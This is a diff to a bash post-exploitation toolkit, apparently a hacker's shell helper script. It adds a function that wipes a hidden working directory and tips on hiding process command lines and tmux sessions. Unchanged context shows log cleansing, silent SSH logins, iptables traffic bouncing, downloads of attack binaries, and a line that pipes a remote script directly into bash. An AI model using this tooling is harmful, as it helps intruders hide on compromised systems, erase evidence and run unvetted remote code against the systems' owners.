@@ -275,6 +275,7 @@ hs_mkhome() {
     [ -d "${XHOME}" ] && return 255
     mkdir -p "${XHOME:?}" 2>/dev/null || return
     echo -e ">>> Using ${CDY}XHOME=${XHOME}${CN}. ${CF}[will auto-destruct on exit]${CN}"
+    echo -e ">>> Type ${CDC}destruct${CN} to erase ${CDY}${XHOME}${CN}"
     echo -e ">>> Type ${CDC}cdx${CN} to change to your hidden ${CDY}\"\${XHOME}\"${CN} directory"
     echo -e ">>> Type ${CDC}keep${CN} to disable auto-destruct on exit."
     # [[ "$PATH" == "$XHOME"* ]] || export PATH="${XHOME}:$PATH"
@@ -359,6 +360,8 @@ bin() {
     [ "$arch" = "x86_64" ] && bin_dl noseyparker "https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static"
 
     [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to force download even if systemwide exists" 
+    echo -e ">>> ${CW}TIP${CN}: Type ${CDC}exec zapper -f -a- bash -il${CN} to hide all command line
+>>> options from the process list"
     echo -e ">>> ${CDG}Download COMPLETE${CN}"
 
     unset -f bin_dl
@@ -440,6 +443,13 @@ ws() {
     dl https://thc.org/ws | bash
 }
 
+destruct() {
+    [ -z "$XHOME" ] && return
+    [ ! -d "$XHOME" ] && return
+    echo -e ">>> Cleansing ${CDY}${XHOME}${CN}"
+    rm -rf "${XHOME:?}"
+}
+
 hs_exit() {
     cd /tmp || cd /dev/shm || cd /
     [ "${#_hs_bounce_src[@]}" -gt 0 ] && HS_WARN "Bounce still set in iptables. Type ${CDC}unbounce${CN} to stop the forward."
@@ -447,8 +457,7 @@ hs_exit() {
         if [ -f "${XHOME}/.keep" ]; then
             HS_WARN "Keeping ${CDY}${XHOME}${CN}"
         else
-            echo -e ">>> Cleansing ${CDY}${XHOME}${CN}"
-            rm -rf "${XHOME:?}"
+            destruct
         fi
     }
     [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.lorg/tips${CN} 😘"
@@ -539,7 +548,7 @@ xhelp() {
     echo -en "\
 ${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
 ${CDC} xsu username                          ${CDM}Switch user
-${CDC} xtmux                                 ${CDM}'hidden' tmux
+${CDC} xtmux                                 ${CDM}'hidden' tmux ${CN}${CF}[e.g. empty tmux list-s]
 ${CDC} xssh                                  ${CDM}Silently log in to remote host
 ${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination
 ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
